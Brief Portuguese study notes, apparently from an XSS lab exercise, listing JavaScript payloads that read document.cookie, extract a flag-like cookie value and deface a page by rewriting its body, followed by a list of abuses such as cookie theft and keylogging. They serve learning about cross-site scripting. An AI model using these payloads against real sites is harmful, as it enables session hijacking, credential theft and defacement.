alert(document.cookie)
	mostra um alerta

document.getElementById("output").innerText = "Cookie value: " + document.cookie;
	retorna "Cookie value: ftCookies=If_You_See_Me_Its_Win"

document.getElementById("output").innerText = "Cookie: " + document.cookie.split("=")[1];
	retorna "Cookie value: If_You_See_Me_Its_Win"

document.body.innerHTML = "<h1>Você foi hackeado</h1>";
	altero o conteúdo da página

Onde essa vulnerabilidade pode ser explorada:
- Roubo de cookies: acesso não autorizado à conta
- Keylogger: Roubo de credenciais